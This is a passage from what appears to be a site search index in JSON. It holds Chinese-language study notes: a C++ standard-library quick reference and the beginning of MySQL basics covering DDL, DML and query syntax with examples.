\u4e2d\u7684\u6700\u5c0f\u503c\u3002","tags":["C++\u901f\u67e5"]},{"location":"program/2024-04-22-C%2B%2B%E5%9F%BA%E7%A1%80/#includevector","title":"\u56db\u3001include<code>&lt;vector&gt;</code>","text":"<p>\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\u65f6\uff0c\u5b9e\u9645\u662f\u4e00\u79cd\u6307\u9488\u7c7b\u578b</p> \u64cd\u4f5c \u63cf\u8ff0 vector a;vector&gt; vector(rows, vector(columns)); \u521b\u5efa\u4e00\u7ef4\u5411\u91cf\u548c\u4e8c\u7ef4\u5411\u91cf\u3002 push_back(num) \u5411\u5411\u91cf\u672b\u5c3e\u6dfb\u52a0\u4e00\u4e2a\u65b0\u5143\u7d20\u3002 pop_back(num) \u5220\u9664\u5411\u91cf\u672b\u5c3e\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002 insert(index,num) \u5728\u6307\u5b9a\u4f4d\u7f6e\u63d2\u5165\u4e00\u4e2a\u65b0\u5143\u7d20\u3002 erase(index) \u5220\u9664\u6307\u5b9a\u4f4d\u7f6e\u7684\u5143\u7d20\u3002 clear() \u6e05\u7a7a\u5411\u91cf\u4e2d\u7684\u6240\u6709\u5143\u7d20\u3002 resize(n) \u6539\u53d8\u5411\u91cf\u7684\u5927\u5c0f\u3002 size() \u8fd4\u56de\u5411\u91cf\u4e2d\u5143\u7d20\u7684\u6570\u91cf\u3002 empty() \u68c0\u67e5\u5411\u91cf\u662f\u5426\u4e3a\u7a7a,\u7a7a\u5219\u8fd4\u56de1\u3002 front() \u8fd4\u56de\u5411\u91cf\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u3002 back() \u8fd4\u56de\u5411\u91cf\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002 begin() \u8fd4\u56de\u5411\u91cf\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u8fed\u4ee3\u5668\u3002 end() \u8fd4\u56de\u5411\u91cf\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684\u8fed\u4ee3\u5668\u3002 at() \u8bbf\u95ee\u6307\u5b9a\u4f4d\u7f6e\u7684\u5143\u7d20\u3002 swap() \u4ea4\u6362\u4e24\u4e2a\u5411\u91cf\u7684\u5185\u5bb9\u3002eg:vector1.swap(vector2) a=b","tags":["C++\u901f\u67e5"]},{"location":"program/2024-04-22-C%2B%2B%E5%9F%BA%E7%A1%80/#includecstring","title":"\u4e94\u3001include<code>&lt;cstring&gt;</code>","text":"\u51fd\u6570 \u63cf\u8ff0 <code>strlen(str)</code> \u8fd4\u56de\u5b57\u7b26\u4e32 <code>str</code> \u7684\u957f\u5ea6\uff0c\u4e0d\u5305\u62ec\u672b\u5c3e\u7684\u7a7a\u5b57\u7b26\uff08<code>\\0</code>\uff09\u3002 <code>strcpy_s(des, src)</code><code>strcpy_s(des, desSize, src)</code> \u5c06\u5b57\u7b26\u4e32 <code>src</code> \u590d\u5236\u5230 <code>des</code>\uff0c\u9700\u8981\u786e\u4fdd <code>des</code> \u6709\u8db3\u591f\u7684\u7a7a\u95f4\u3002\u7b2c\u4e8c\u4e2a\u7248\u672c\u5305\u62ec <code>desSize</code> \u4ee5\u9632\u6b62\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 <code>strcat_s(des, desSize, src)</code><code>strncat_s(des, desSize, src, count)</code> \u5c06\u5b57\u7b26\u4e32 <code>src</code> \u8fde\u63a5\u5230 <code>des</code> \u7684\u672b\u5c3e\u3002<code>strcat_s</code> \u8981\u6c42 <code>des</code> \u6709\u8db3\u591f\u7684\u7a7a\u95f4\u5e76\u63d0\u4f9b <code>desSize</code>\uff0c<code>strncat_s</code> \u5219\u9650\u5236\u8fde\u63a5\u7684\u6700\u5927\u5b57\u7b26\u6570\uff08<code>count</code>\uff09\u3002 <code>strcmp(str1, str2)</code><code>strncmp(str1, str2, n)</code> \u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\u3002\u5982\u679c\u5b83\u4eec\u76f8\u7b49\uff0c\u8fd4\u56de0\uff1b\u5982\u679c <code>str1</code> \u5c0f\u4e8e <code>str2</code>\uff0c\u8fd4\u56de\u8d1f\u503c\uff1b\u5982\u679c <code>str1</code> \u5927\u4e8e <code>str2</code>\uff0c\u8fd4\u56de\u6b63\u503c\u3002<code>strncmp</code> \u53ea\u6bd4\u8f83\u524d <code>n</code> \u4e2a\u5b57\u7b26\u3002 <code>strchr(str, c)</code> \u67e5\u627e\u5b57\u7b26\u4e32 <code>str</code> \u4e2d\u9996\u6b21\u51fa\u73b0\u5b57\u7b26 <code>c</code> \u7684\u4f4d\u7f6e\uff0c\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u8be5\u5b57\u7b26\u7684\u6307\u9488\u3002\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5219\u8fd4\u56de <code>NULL</code>\u3002 <code>strrchr(str, c)</code> \u67e5\u627e\u5b57\u7b26\u4e32 <code>str</code> \u4e2d\u6700\u540e\u4e00\u6b21\u51fa\u73b0\u5b57\u7b26 <code>c</code> \u7684\u4f4d\u7f6e\uff0c\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u8be5\u5b57\u7b26\u7684\u6307\u9488\u3002 <code>strstr(haystack, needle)</code> \u5728\u5b57\u7b26\u4e32 <code>haystack</code> \u4e2d\u67e5\u627e\u5b50\u5b57\u7b26\u4e32 <code>needle</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u9996\u6b21\u5339\u914d\u4f4d\u7f6e\u7684\u6307\u9488\u3002\u5982\u679c\u627e\u4e0d\u5230\uff0c\u8fd4\u56de <code>NULL</code>\u3002 <code>strtok_s(str, delimiters, &amp;context)</code> \u7528\u6307\u5b9a\u7684\u5206\u9694\u7b26\u62c6\u5206\u5b57\u7b26\u4e32\u3002<code>context</code> \u662f\u4e00\u4e2a\u6307\u5411\u4fdd\u5b58\u72b6\u6001\u7684\u6307\u9488\u3002","tags":["C++\u901f\u67e5"]},{"location":"program/2024-04-22-C%2B%2B%E5%9F%BA%E7%A1%80/#includestring","title":"\u516d\u3001include<code>&lt;string&gt;</code>","text":"\u64cd\u4f5c/\u5c5e\u6027 \u8bf4\u660e \u6784\u9020 string \u5bf9\u8c61 <code>string()</code> \u521b\u5efa\u4e00\u4e2a\u7a7a\u4e32 <code>string(const string&amp; s)</code> \u4ee5\u5b57\u7b26\u4e32 <code>s</code> \u590d\u5236\u6784\u9020 <code>string(const char* cstr)</code> \u4ee5C\u5b57\u7b26\u4e32 <code>cstr</code> \u6784\u9020 <code>string(size_t n, char ch)</code> \u4ee5 <code>n</code> \u4e2a <code>ch</code> \u5b57\u7b26\u6784\u9020 <code>string(const char* cstr, size_t beg, size_t len)</code> \u4ee5 <code>cstr</code> \u4e2d\u4ece <code>beg</code> \u5f00\u59cb\u3001\u957f\u5ea6\u4e3a <code>len</code> \u7684\u5b50\u4e32\u6784\u9020 <code>to_string(int)</code> \u5c06\u6574\u6570int\u8f6c\u5316\u4e3astring\u7c7b \u8fd4\u56de string \u5c5e\u6027 <code>s.size()</code> \u8fd4\u56de\u5b57\u7b26\u4e32\u957f\u5ea6 <code>s.length()</code> \u540c <code>size()</code> <code>s.capacity()</code> \u8fd4\u56de\u5b57\u7b26\u4e32\u5bb9\u91cf <code>s.max_size()</code> \u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u6700\u5927\u5141\u8bb8\u957f\u5ea6 <code>s.empty()</code> \u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u7a7a \u5bf9\u8c61\u8d4b\u503c\u64cd\u4f5c <code>s2 = s1</code> \u5c06 <code>s1</code> \u8d4b\u503c\u7ed9 <code>s2</code> <code>s = cstr</code> \u5c06C\u5b57\u7b26\u4e32 <code>cstr</code> \u8d4b\u503c\u7ed9 <code>s</code> <code>s.assign(const string&amp; s)</code> \u5c06\u5b57\u7b26\u4e32 <code>s</code> \u8d4b\u503c\u7ed9 <code>s</code> <code>s.assign(const char* cstr)</code> \u5c06C\u5b57\u7b26\u4e32 <code>cstr</code> \u8d4b\u503c\u7ed9 <code>s</code> <code>s.assign(size_t num, char c)</code> \u5c06 <code>num</code> \u4e2a\u5b57\u7b26 <code>c</code> \u8d4b\u503c\u7ed9 <code>s</code> \u5b58\u53d6\u5143\u7d20 <code>s[idx]</code> \u8fd4\u56de\u4e0b\u6807\u4e3a <code>idx</code> \u7684\u5b57\u7b26\uff08\u4e0d\u68c0\u67e5\u4e0b\u6807\u5408\u6cd5\u6027\uff09 <code>s.at(idx)</code> \u8fd4\u56de\u4e0b\u6807\u4e3a <code>idx</code> \u7684\u5b57\u7b26\uff08\u68c0\u67e5\u4e0b\u6807\u5408\u6cd5\u6027\uff09 <code>s.data()</code> \u8fd4\u56de\u5b57\u7b26\u4e32\u6570\u636e\u7684\u6307\u9488 <code>s.c_str()</code> \u8fd4\u56deC\u98ce\u683c\u7684\u5b57\u7b26\u4e32 \u63d2\u5165\u64cd\u4f5c <code>s2.insert(idx, const string&amp; s1)</code> \u5728 <code>s2</code> \u7684 <code>idx</code> \u5904\u63d2\u5165\u5b57\u7b26\u4e32 <code>s1</code> <code>s.insert(idx, const char* cstr)</code> \u5728 <code>s</code> \u7684 <code>idx</code> \u5904\u63d2\u5165C\u5b57\u7b26\u4e32 <code>cstr</code> <code>s2 += s1</code> \u5c06\u5b57\u7b26\u4e32 <code>s1</code> \u8ffd\u52a0\u5230 <code>s2</code> \u7684\u672b\u5c3e <code>s2.append(const string&amp; s1)</code> \u5c06\u5b57\u7b26\u4e32 <code>s1</code> \u8ffd\u52a0\u5230 <code>s2</code> \u7684\u672b\u5c3e <code>s += cstr</code> \u5c06C\u5b57\u7b26\u4e32 <code>cstr</code> \u8ffd\u52a0\u5230 <code>s</code> \u7684\u672b\u5c3e <code>s.append(const char* cstr)</code> \u5c06C\u5b57\u7b26\u4e32 <code>cstr</code> \u8ffd\u52a0\u5230 <code>s</code> \u7684\u672b\u5c3e <code>s += char c</code> \u5c06\u5b57\u7b26 <code>c</code> \u8ffd\u52a0\u5230 <code>s</code> \u7684\u672b\u5c3e \u622a\u53d6\u5b50\u4e32 <code>s.substr(0)</code> \u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u526f\u672c <code>s.substr(idx)</code> \u8fd4\u56de\u4ece\u4e0b\u6807\u4e3a <code>idx</code> \u5f00\u59cb\u7684\u5b50\u4e32 <code>s.substr(idx, len)</code> \u8fd4\u56de\u4ece\u4e0b\u6807\u4e3a <code>idx</code> \u5f00\u59cb\u3001\u957f\u5ea6\u4e3a <code>len</code> \u7684\u5b50\u4e32 \u4e32\u8fde\u63a5\u64cd\u4f5c <code>s1 + s2</code> \u5c06 <code>s2</code> \u8fde\u63a5\u5230 <code>s1</code> \u540e\u9762 <code>s + cstr</code> \u5c06C\u5b57\u7b26\u4e32 <code>cstr</code> \u8fde\u63a5\u5230 <code>s</code> \u540e\u9762 <code>cstr + s</code> \u5c06 <code>s</code> \u8fde\u63a5\u5230C\u5b57\u7b26\u4e32 <code>cstr</code> \u540e\u9762 <code>char c + s</code> \u5c06\u5b57\u7b26 <code>c</code> \u8fde\u63a5\u5230 <code>s</code> \u540e\u9762 \u5220\u9664\u64cd\u4f5c <code>s.clear()</code> \u6e05\u7a7a\u5b57\u7b26\u4e32\u5185\u5bb9 <code>s.erase()</code> \u5220\u9664\u5b57\u7b26\u4e32\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5e76\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61 <code>s.erase(idx)</code> \u5220\u9664\u4ece\u4e0b\u6807\u4e3a <code>idx</code> \u5f00\u59cb\u7684\u6240\u6709\u5b57\u7b26\uff0c\u5e76\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61 <code>s.erase(idx, len)</code> \u5220\u9664\u4ece\u4e0b\u6807\u4e3a <code>idx</code> \u5f00\u59cb\u3001\u6700\u591a\u957f\u5ea6\u4e3a <code>len</code> \u7684\u5b57\u7b26\uff0c\u5e76\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61 \u66ff\u6362\u64cd\u4f5c <code>s2.replace(idx, len, const string&amp; s1)</code> \u66ff\u6362 <code>s2</code> \u4e2d\u4ece <code>idx</code> \u5f00\u59cb\u3001\u957f\u5ea6\u4e3a <code>len</code> \u7684\u5b57\u7b26\u4e3a\u5b57\u7b26\u4e32 <code>s1</code> <code>s2.replace(beg, end, const string&amp; s1)</code> \u66ff\u6362 <code>s2</code> \u4e2d\u4f4d\u4e8e\u533a\u95f4 <code>[beg, end]</code> \u7684\u5b50\u4e32\u4e3a\u5b57\u7b26\u4e32 <code>s1</code> <code>s.replace(beg, end, newBeg, newEnd)</code> \u66ff\u6362 <code>s</code> \u4e2d\u4f4d\u4e8e\u533a\u95f4 <code>[beg, end]</code> \u7684\u5b50\u4e32\u4e3a <code>s</code> \u4e2d\u4f4d\u4e8e\u533a\u95f4 <code>[newBeg, newEnd]</code> \u7684\u5b50\u4e32 \u67e5\u627e\u64cd\u4f5c <code>s.find(char c)</code> \u5728 <code>s</code> \u4e2d\u67e5\u627e\u5b57\u7b26 <code>c</code>\uff0c\u8fd4\u56de\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4e0b\u6807 <code>s.find(char c, idx)</code> \u5728 <code>s</code> \u4e2d\u4ece\u4e0b\u6807\u4e3a <code>idx</code> \u5f00\u59cb\u67e5\u627e\u5b57\u7b26 <code>c</code>\uff0c\u8fd4\u56de\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4e0b\u6807 <code>s.find(const string&amp; sub)</code> \u5728 <code>s</code> \u4e2d\u67e5\u627e\u5b50\u4e32 <code>sub</code>\uff0c\u8fd4\u56de\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4e0b\u6807 <code>s.find(const char* cstr)</code> \u5728 <code>s</code> \u4e2d\u67e5\u627eC\u5b57\u7b26\u4e32 <code>cstr</code>\uff0c\u8fd4\u56de\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4e0b\u6807 <code>s.find_first_of(const string&amp; sub)</code> \u5728 <code>s</code> \u4e2d\u67e5\u627e\u4e0e <code>sub</code> \u4e2d\u4efb\u610f\u5b57\u7b26\u76f8\u540c\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u8fd4\u56de\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4e0b\u6807 <code>s.find_first_of(const char* cstr)</code> \u5728 <code>s</code> \u4e2d\u67e5\u627e\u4e0eC\u5b57\u7b26\u4e32 <code>cstr</code> \u4e2d\u4efb\u610f\u5b57\u7b26\u76f8\u540c\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u8fd4\u56de\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4e0b\u6807 \u4e32\u6bd4\u8f83 <code>s1&lt;|&lt;=|&gt;|&gt;=|==|\uff01=s1</code> s2\u4e0es1\u6bd4\u8f83\uff0c\u8fd4\u56de true \u6216false <code>s&lt;|&lt;=|&gt;|&gt;=|==|\uff01=cstr</code> s2\u4e0ecstr \u6bd4\u8f83\uff0c\u8fd4\u56de true \u6216false <code>s2.compare(sl)</code> \u6bd4\u8f83 s2 \u548c s1\uff0c\u8fd4\u56de 0(\u76f8\u7b49)\uff0c\u6b63\u6570(s2\u5927\u4e8e s1)\u6216\u8d1f\u6570(s2 \u5c0f\u4e8e s1) <code>s.compare(cstr)</code> \u6bd4\u8f83s\u548c cstr\uff0c\u8fd4\u56de0(\u76f8\u7b49)\uff0c\u6b63\u6570(s\u5927\u4e8e cstr)\u6216\u8d1f\u6570(s\u5c0f\u4e8e cstr) <p>\u5373\u7528char[]\u6216char*\u8868\u793a\u7684C\u5b57\u7b26\u4e32:\u6ce8:\u53c2\u6570<code>cstr</code>\u4e3a<code>Cstring</code>\u3002</p>","tags":["C++\u901f\u67e5"]},{"location":"program/2024-04-22-C%2B%2B%E5%9F%BA%E7%A1%80/#includealgorithm","title":"\u4e03\u3001include<code>&lt;algorithm&gt;</code>          coolzest","text":"\u64cd\u4f5c \u63cf\u8ff0 <code>reverse(str.begin(),str.begin())</code> \u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u6216\u8005\u5411\u91cf\u53cd\u8f6c\u3002 <p>regards.</p>","tags":["C++\u901f\u67e5"]},{"location":"program/2024-04-22-MYSQL/","title":"\u57fa\u7840\u7bc7","text":""},{"location":"program/2024-04-22-MYSQL/#_2","title":"\u901a\u7528\u8bed\u6cd5\u53ca\u5206\u7c7b","text":"<ul> <li>DDL: \u6570\u636e\u5b9a\u4e49\u8bed\u8a00\uff0c\u7528\u6765\u5b9a\u4e49\u6570\u636e\u5e93\u5bf9\u8c61\uff08\u6570\u636e\u5e93\u3001\u8868\u3001\u5b57\u6bb5\uff09</li> <li>DML: \u6570\u636e\u64cd\u4f5c\u8bed\u8a00\uff0c\u7528\u6765\u5bf9\u6570\u636e\u5e93\u8868\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u589e\u5220\u6539</li> <li>DQL: \u6570\u636e\u67e5\u8be2\u8bed\u8a00\uff0c\u7528\u6765\u67e5\u8be2\u6570\u636e\u5e93\u4e2d\u8868\u7684\u8bb0\u5f55</li> <li>DCL: \u6570\u636e\u63a7\u5236\u8bed\u8a00\uff0c\u7528\u6765\u521b\u5efa\u6570\u636e\u5e93\u7528\u6237\u3001\u63a7\u5236\u6570\u636e\u5e93\u7684\u63a7\u5236\u6743\u9650</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#ddl","title":"DDL\uff08\u6570\u636e\u5b9a\u4e49\u8bed\u8a00\uff09","text":"<p>\u6570\u636e\u5b9a\u4e49\u8bed\u8a00</p>"},{"location":"program/2024-04-22-MYSQL/#_3","title":"\u6570\u636e\u5e93\u64cd\u4f5c","text":"<p>\u67e5\u8be2\u6240\u6709\u6570\u636e\u5e93: <code>SHOW DATABASES;</code> \u67e5\u8be2\u5f53\u524d\u6570\u636e\u5e93\uff1a <code>SELECT DATABASE();</code> \u521b\u5efa\u6570\u636e\u5e93\uff1a <code>CREATE DATABASE [ IF NOT EXISTS ] \u6570\u636e\u5e93\u540d [ DEFAULT CHARSET \u5b57\u7b26\u96c6] [COLLATE \u6392\u5e8f\u89c4\u5219 ];</code> \u5220\u9664\u6570\u636e\u5e93: <code>DROP DATABASE [ IF EXISTS ] \u6570\u636e\u5e93\u540d;</code> \u4f7f\u7528\u6570\u636e\u5e93\uff1a <code>USE \u6570\u636e\u5e93\u540d;</code></p>"},{"location":"program/2024-04-22-MYSQL/#_4","title":"\u6ce8\u610f\u4e8b\u9879","text":"<ul> <li>UTF8\u5b57\u7b26\u96c6\u957f\u5ea6\u4e3a3\u5b57\u8282\uff0c\u6709\u4e9b\u7b26\u53f7\u53604\u5b57\u8282\uff0c\u6240\u4ee5\u63a8\u8350\u7528utf8mb4\u5b57\u7b26\u96c6</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_5","title":"\u8868\u64cd\u4f5c","text":"<p>\u67e5\u8be2\u5f53\u524d\u6570\u636e\u5e93\u6240\u6709\u8868\uff1a <code>SHOW TABLES;</code> \u67e5\u8be2\u8868\u7ed3\u6784\uff1a <code>DESC \u8868\u540d;</code> \u67e5\u8be2\u6307\u5b9a\u8868\u7684\u5efa\u8868\u8bed\u53e5\uff1a <code>SHOW CREATE TABLE \u8868\u540d;</code> </p> <p>\u521b\u5efa\u8868\uff1a MySQL<pre><code>CREATE TABLE \u8868\u540d(\n    \u5b57\u6bb51 \u5b57\u6bb51\u7c7b\u578b [COMMENT \u5b57\u6bb51\u6ce8\u91ca],\n    \u5b57\u6bb52 \u5b57\u6bb52\u7c7b\u578b [COMMENT \u5b57\u6bb52\u6ce8\u91ca],\n    \u5b57\u6bb53 \u5b57\u6bb53\u7c7b\u578b [COMMENT \u5b57\u6bb53\u6ce8\u91ca],\n    ...\n    \u5b57\u6bb5n \u5b57\u6bb5n\u7c7b\u578b [COMMENT \u5b57\u6bb5n\u6ce8\u91ca]\n)[ COMMENT \u8868\u6ce8\u91ca ];\n</code></pre> \u6240\u6709\u7684\u8981\u7528\u82f1\u6587\u7684\u683c\u5f0f \u6700\u540e\u4e00\u4e2a\u5b57\u6bb5\u540e\u9762\u6ca1\u6709\u9017\u53f7</p> <p>\u6dfb\u52a0\u5b57\u6bb5\uff1a  <code>ALTER TABLE \u8868\u540d ADD \u5b57\u6bb5\u540d \u7c7b\u578b(\u957f\u5ea6) [COMMENT \u6ce8\u91ca] [\u7ea6\u675f];</code> \u4f8b\uff1a<code>ALTER TABLE emp ADD nickname varchar(20) COMMENT '\u6635\u79f0';</code> </p> <p>\u4fee\u6539\u6570\u636e\u7c7b\u578b\uff1a  <code>ALTER TABLE \u8868\u540d MODIFY \u5b57\u6bb5\u540d \u65b0\u6570\u636e\u7c7b\u578b(\u957f\u5ea6);</code> </p> <p>\u4fee\u6539\u5b57\u6bb5\u540d\u548c\u5b57\u6bb5\u7c7b\u578b\uff1a  <code>ALTER TABLE \u8868\u540d CHANGE \u65e7\u5b57\u6bb5\u540d \u65b0\u5b57\u6bb5\u540d \u7c7b\u578b(\u957f\u5ea6) [COMMENT \u6ce8\u91ca] [\u7ea6\u675f];</code> </p> <p>\u4f8b\uff1a\u5c06emp\u8868\u7684nickname\u5b57\u6bb5\u4fee\u6539\u4e3ausername\uff0c\u7c7b\u578b\u4e3avarchar(30) <code>ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT '\u6635\u79f0';</code> </p> <p>\u5220\u9664\u5b57\u6bb5\uff1a <code>ALTER TABLE \u8868\u540d DROP \u5b57\u6bb5\u540d;</code></p> <p>\u4fee\u6539\u8868\u540d\uff1a <code>ALTER TABLE \u8868\u540d RENAME TO \u65b0\u8868\u540d</code></p> <p>\u5220\u9664\u8868\uff1a <code>DROP TABLE [IF EXISTS] \u8868\u540d;</code></p> <p>\u5220\u9664\u8868\uff0c\u5e76\u91cd\u65b0\u521b\u5efa\u8be5\u8868\uff1a <code>TRUNCATE TABLE \u8868\u540d;</code></p>"},{"location":"program/2024-04-22-MYSQL/#dml","title":"DML\uff08\u6570\u636e\u64cd\u4f5c\u8bed\u8a00\uff09","text":""},{"location":"program/2024-04-22-MYSQL/#_6","title":"\u6dfb\u52a0\u6570\u636e","text":"<p>\u6307\u5b9a\u5b57\u6bb5\uff1a  <code>INSERT INTO \u8868\u540d (\u5b57\u6bb5\u540d1, \u5b57\u6bb5\u540d2, ...) VALUES (\u503c1, \u503c2, ...);</code> \u5168\u90e8\u5b57\u6bb5\uff1a  <code>INSERT INTO \u8868\u540d VALUES (\u503c1, \u503c2, ...);</code> </p> <p>\u6279\u91cf\u6dfb\u52a0\u6570\u636e\uff1a  <code>INSERT INTO \u8868\u540d (\u5b57\u6bb5\u540d1, \u5b57\u6bb5\u540d2, ...) VALUES (\u503c1, \u503c2, ...), (\u503c1, \u503c2, ...), (\u503c1, \u503c2, ...);</code> <code>INSERT INTO \u8868\u540d VALUES (\u503c1, \u503c2, ...), (\u503c1, \u503c2, ...), (\u503c1, \u503c2, ...);</code> </p>"},{"location":"program/2024-04-22-MYSQL/#_7","title":"\u6ce8\u610f\u4e8b\u9879","text":"<ul> <li>\u5b57\u7b26\u4e32\u548c\u65e5\u671f\u7c7b\u578b\u6570\u636e\u5e94\u8be5\u5305\u542b\u5728\u5f15\u53f7\u4e2d</li> <li>\u63d2\u5165\u7684\u6570\u636e\u5927\u5c0f\u5e94\u8be5\u5728\u5b57\u6bb5\u7684\u89c4\u5b9a\u8303\u56f4\u5185</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_8","title":"\u66f4\u65b0\u548c\u5220\u9664\u6570\u636e","text":"<p>\u4fee\u6539\u6570\u636e\uff1a <code>UPDATE \u8868\u540d SET \u5b57\u6bb5\u540d1 = \u503c1, \u5b57\u6bb5\u540d2 = \u503c2, ... [ WHERE \u6761\u4ef6 ];</code> \u4f8b\uff1a  <code>UPDATE emp SET name = 'Jack' WHERE id = 1;</code></p> <p>\u5220\u9664\u6570\u636e\uff1a <code>DELETE FROM \u8868\u540d [ WHERE \u6761\u4ef6 ];</code> </p>"},{"location":"program/2024-04-22-MYSQL/#dql","title":"DQL\uff08\u6570\u636e\u67e5\u8be2\u8bed\u8a00\uff09","text":"<p>\u8bed\u6cd5\uff1a MySQL<pre><code>SELECT\n    \u5b57\u6bb5\u5217\u8868\nFROM\n    \u8868\u540d\u5b57\u6bb5\nWHERE\n    \u6761\u4ef6\u5217\u8868\nGROUP BY\n    \u5206\u7ec4\u5b57\u6bb5\u5217\u8868\nHAVING\n    \u5206\u7ec4\u540e\u7684\u6761\u4ef6\u5217\u8868\nORDER BY\n    \u6392\u5e8f\u5b57\u6bb5\u5217\u8868\nLIMIT\n    \u5206\u9875\u53c2\u6570\n</code></pre></p>"},{"location":"program/2024-04-22-MYSQL/#_9","title":"\u57fa\u7840\u67e5\u8be2","text":"<p>\u67e5\u8be2\u591a\u4e2a\u5b57\u6bb5\uff1a <code>SELECT \u5b57\u6bb51, \u5b57\u6bb52, \u5b57\u6bb53, ... FROM \u8868\u540d;</code> <code>SELECT * FROM \u8868\u540d;</code> </p> <p>\u8bbe\u7f6e\u522b\u540d\uff1a <code>SELECT \u5b57\u6bb51 [ AS \u522b\u540d1 ], \u5b57\u6bb52 [ AS \u522b\u540d2 ], \u5b57\u6bb53 [ AS \u522b\u540d3 ], ... FROM \u8868\u540d;</code> <code>SELECT \u5b57\u6bb51 [ \u522b\u540d1 ], \u5b57\u6bb52 [ \u522b\u540d2 ], \u5b57\u6bb53 [ \u522b\u540d3 ], ... FROM \u8868\u540d;</code> </p> <p>\u53bb\u9664\u91cd\u590d\u8bb0\u5f55\uff1a <code>SELECT DISTINCT \u5b57\u6bb5\u5217\u8868 FROM \u8868\u540d;</code> </p> <p>\u8f6c\u4e49\uff1a <code>SELECT * FROM \u8868\u540d WHERE name LIKE '/_\u5f20\u4e09' ESCAPE '/'</code> / \u4e4b\u540e\u7684_\u4e0d\u4f5c\u4e3a\u901a\u914d\u7b26  </p>"},{"location":"program/2024-04-22-MYSQL/#_10","title":"\u6761\u4ef6\u67e5\u8be2","text":"<p>\u8bed\u6cd5\uff1a <code>SELECT \u5b57\u6bb5\u5217\u8868 FROM \u8868\u540d WHERE \u6761\u4ef6\u5217\u8868;</code> </p> <p>\u6761\u4ef6\uff1a  </p> \u6bd4\u8f83\u8fd0\u7b97\u7b26 \u529f\u80fd &gt; \u5927\u4e8e &gt;= \u5927\u4e8e\u7b49\u4e8e &lt; \u5c0f\u4e8e &lt;= \u5c0f\u4e8e\u7b49\u4e8e = \u7b49\u4e8e &lt;&gt; \u6216 != \u4e0d\u7b49\u4e8e BETWEEN ... AND ... \u5728\u67d0\u4e2a\u8303\u56f4\u5185\uff08\u542b\u6700\u5c0f\u3001\u6700\u5927\u503c\uff09 IN(...) \u5728in\u4e4b\u540e\u7684\u5217\u8868\u4e2d\u7684\u503c\uff0c\u591a\u9009\u4e00 LIKE \u5360\u4f4d\u7b26 \u6a21\u7cca\u5339\u914d\uff08_\u5339\u914d\u5355\u4e2a\u5b57\u7b26\uff0c%\u5339\u914d\u4efb\u610f\u4e2a\u5b57\u7b26\uff09 IS NULL \u662fNULL \u903b\u8f91\u8fd0\u7b97\u7b26 \u529f\u80fd AND \u6216 &amp;&amp; \u5e76\u4e14\uff08\u591a\u4e2a\u6761\u4ef6\u540c\u65f6\u6210\u7acb\uff09 OR \u6216 || \u6216\u8005\uff08\u591a\u4e2a\u6761\u4ef6\u4efb\u610f\u4e00\u4e2a\u6210\u7acb\uff09 NOT \u6216 ! \u975e\uff0c\u4e0d\u662f <p>\u4f8b\u5b50\uff1a MySQL<pre><code>-- \u5e74\u9f84\u7b49\u4e8e30\nselect * from employee where age = 30;\n-- \u5e74\u9f84\u5c0f\u4e8e30\nselect * from employee where age &lt; 30;\n-- \u5c0f\u4e8e\u7b49\u4e8e\nselect * from employee where age &lt;= 30;\n-- \u6ca1\u6709\u8eab\u4efd\u8bc1\nselect * from employee where idcard is null or idcard = '';\n-- \u6709\u8eab\u4efd\u8bc1\nselect * from employee where idcard;\nselect * from employee where idcard is not null;\n-- \u4e0d\u7b49\u4e8e\nselect * from employee where age != 30;\n-- \u5e74\u9f84\u572820\u523030\u4e4b\u95f4\nselect * from employee where age between 20 and 30;\nselect * from employee where age &gt;= 20 and age &lt;= 30;\n-- \u4e0b\u9762\u8bed\u53e5\u4e0d\u62a5\u9519\uff0c\u4f46\u67e5\u4e0d\u5230\u4efb\u4f55\u4fe1\u606f\nselect * from employee where age between 30 and 20;\n-- \u6027\u522b\u4e3a\u5973\u4e14\u5e74\u9f84\u5c0f\u4e8e30\nselect * from employee where age &lt; 30 and gender = '\u5973';\n-- \u5e74\u9f84\u7b49\u4e8e25\u621630\u621635\nselect * from employee where age = 25 or age = 30 or age = 35;\nselect * from employee where age in (25, 30, 35);\n-- \u59d3\u540d\u4e3a\u4e24\u4e2a\u5b57\nselect * from employee where name like '__';\n-- \u8eab\u4efd\u8bc1\u6700\u540e\u4e3aX\nselect * from employee where idcard like '%X';\n</code></pre></p>"},{"location":"program/2024-04-22-MYSQL/#_11","title":"\u805a\u5408\u67e5\u8be2\uff08\u805a\u5408\u51fd\u6570\uff09","text":"<p>\u5e38\u89c1\u805a\u5408\u51fd\u6570\uff1a</p> \u51fd\u6570 \u529f\u80fd count \u7edf\u8ba1\u6570\u91cf max \u6700\u5927\u503c min \u6700\u5c0f\u503c avg \u5e73\u5747\u503c sum \u6c42\u548c <p>\u8bed\u6cd5\uff1a 